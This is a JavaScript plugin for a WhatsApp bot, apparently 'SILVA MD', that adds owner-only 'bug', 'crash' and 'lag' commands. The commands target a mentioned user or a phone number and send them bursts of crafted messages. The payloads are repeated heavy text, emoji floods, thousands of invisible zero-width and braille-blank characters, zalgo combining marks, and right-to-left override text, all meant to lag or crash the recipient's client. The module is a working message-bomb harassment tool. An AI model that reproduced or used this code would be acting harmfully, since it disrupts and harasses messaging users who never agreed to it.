const config = require('../config')

const handler = {
    help: ['bug', 'crash', 'lag'],
    tags: ['fun', 'owner'],
    command: /^(bug|crash|lag)$/i,
    group: false,
    admin: false,
    botAdmin: false,
    owner: true,

    execute: async ({ jid, sock, message, args, text }) => {
        try {
            const sender = message.key.participant || message.key.remoteJid
            const command = text.split(' ')[0].toLowerCase()

            const mentions = message.message?.extendedTextMessage?.contextInfo?.mentionedJid || []
            const numArg = args[0]?.replace(/[^0-9]/g, '')
            const bugType = args[1]?.toLowerCase() || args[0]?.toLowerCase() || '1'

            let targetJid = null
            if (mentions.length > 0) {
                targetJid = mentions[0]
            } else if (numArg && numArg.length >= 7) {
                targetJid = numArg + '@s.whatsapp.net'
            }

            if (!targetJid) {
                return sock.sendMessage(jid, {
                    text: `╭━━━━━━━━━━━━━━━━━━━━╮
┃   🐛 BUG SENDER     ┃
╰━━━━━━━━━━━━━━━━━━━━╯

*Usage:*
${config.PREFIX}bug @user <type>
${config.PREFIX}bug <number> <type>
${config.PREFIX}crash @user <type>
${config.PREFIX}lag @user <type>

*Bug Types:*
1 - Text bomb (heavy text)
2 - Emoji flood
3 - Blank bomb
4 - Zalgo text
5 - Reverse text bomb

_Owner only command. Use responsibly!_`
                }, { quoted: message })
            }

            await sock.sendMessage(jid, {
                react: { text: '🐛', key: message.key }
            })

            const bugMessages = generateBug(bugType)

            for (const bugMsg of bugMessages) {
                try {
                    await sock.sendMessage(targetJid, bugMsg)
                    await new Promise(r => setTimeout(r, 300))
                } catch (e) {}
            }

            await sock.sendMessage(jid, {
                react: { text: '✅', key: message.key }
            })

            await sock.sendMessage(jid, {
                text: `🐛 *Bug sent to @${targetJid.split('@')[0]}*\nType: ${bugType}`,
                mentions: [targetJid]
            }, { quoted: message })

        } catch (err) {
            await sock.sendMessage(jid, {
                text: `❌ Error: ${err.message}`
            }, { quoted: message })
        }
    }
}

function generateBug(type) {
    const bugs = []
    
    switch (type) {
        case '1':
        case 'text': {
            const heavy = '꧁ঔৣ☬✞ SILVA MD ✞☬ঔৣ꧂'.repeat(100)
            bugs.push({ text: heavy })
            bugs.push({ text: heavy })
            bugs.push({ text: heavy })
            break
        }
        case '2':
        case 'emoji': {
            const emojis = '💀☠️👻😈🔥⚡🌪️💣🧨🎆🎇✨💫⭐🌟💥💢💦💨🕳️💤💮🏵️🌸💠'.repeat(50)
            bugs.push({ text: emojis })
            bugs.push({ text: emojis })
            bugs.push({ text: emojis })
            break
        }
        case '3':
        case 'blank': {
            const blank = '\u200e'.repeat(5000) + '\u2800'.repeat(5000)
            bugs.push({ text: blank })
            bugs.push({ text: blank })
            bugs.push({ text: blank })
            break
        }
        case '4':
        case 'zalgo': {
            let zalgo = ''
            const base = 'SILVA MD BOT BUG '
            for (const char of base.repeat(30)) {
                zalgo += char
                for (let i = 0; i < 15; i++) {
                    zalgo += String.fromCharCode(0x0300 + Math.floor(Math.random() * 112))
                }
            }
            bugs.push({ text: zalgo })
            bugs.push({ text: zalgo })
            break
        }
        case '5':
        case 'reverse': {
            const rtl = '\u202e'
            const text = rtl + 'SILVA MD BOT '.repeat(200)
            bugs.push({ text: text })
            bugs.push({ text: text })
            bugs.push({ text: text })
            break
        }
        default: {
            const heavy = '꧁ঔৣ☬✞ SILVA MD ✞☬ঔৣ꧂'.repeat(100)
            bugs.push({ text: heavy })
            bugs.push({ text: heavy })
            break
        }
    }

    return bugs
}

module.exports = { handler }
